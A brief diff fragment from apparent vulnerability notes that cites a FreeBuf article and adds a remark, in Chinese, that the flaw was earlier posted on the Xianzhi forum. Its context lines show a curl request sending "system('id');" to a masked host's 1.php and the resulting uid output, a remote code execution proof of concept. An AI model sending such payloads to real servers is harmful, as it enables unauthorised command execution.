@@ -8,3 +8,6 @@ https://www.freebuf.com/vuls/217586.html
 
 ➜ curl http://xxxxxxx/1.php --data "system('id');"    
 uid=1000(www) gid=1000(www) groups=1000(www)
+
+
+顺便说一下这个漏洞之前在先知上发过。https://xz.aliyun.com/t/3529
